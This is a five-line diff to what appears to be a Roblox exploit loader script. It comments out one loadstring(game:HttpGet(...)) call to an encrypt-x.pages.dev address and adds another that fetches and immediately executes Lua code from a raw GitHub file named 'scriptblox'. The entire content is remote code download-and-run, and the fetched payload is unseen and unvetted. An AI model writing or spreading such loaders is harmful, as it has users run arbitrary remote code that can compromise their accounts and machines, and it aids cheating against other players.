@@ -1,1 +1,5 @@
+--[[
 loadstring(game:HttpGet("https://encrypt-x.pages.dev/Scripts?Id=3165734721935"))("3165734721935")
+]]
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Sam00-debug/C-/refs/heads/main/scriptblox"))()
